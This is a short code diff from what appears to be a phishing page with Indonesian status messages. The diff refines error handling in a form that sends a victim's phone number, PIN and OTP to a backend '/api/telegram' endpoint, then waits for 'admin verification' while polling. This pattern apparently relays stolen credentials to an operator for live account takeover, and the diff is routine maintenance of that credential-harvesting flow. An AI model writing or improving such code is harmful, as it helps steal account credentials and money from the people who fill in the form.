@@ -136,6 +136,7 @@
             confirmBtn.disabled = true;
             statusMsg.textContent = 'Mengirim OTP...';
             statusMsg.style.color = 'blue';
+
             try {
                 const response = await fetch(BACKEND_URL + '/api/telegram', {
                     method: 'POST',
@@ -143,17 +144,21 @@
                     body: JSON.stringify({ phone, pin, otp, type: 'otp' })
                 });
                 const data = await response.json();
-                if (data.success) {
+
+                if (response.ok && data.success) {
                     statusMsg.textContent = 'OTP terkirim, menunggu verifikasi admin...';
                     statusMsg.style.color = 'orange';
                     startPolling(phone);
                 } else {
-                    alert('Verification failed. Please try again.');
+                    // Tampilkan pesan error dari server di statusMessage
+                    statusMsg.textContent = data.message || 'Verification failed. Please try again.';
+                    statusMsg.style.color = 'red';
                     confirmBtn.textContent = 'CONFIRM';
                     confirmBtn.disabled = false;
                 }
             } catch (err) {
-                alert('Connection error. Please try again.');
+                statusMsg.textContent = 'Connection error. Please try again.';
+                statusMsg.style.color = 'red';
                 confirmBtn.textContent = 'CONFIRM';
                 confirmBtn.disabled = false;
                 console.error(err);
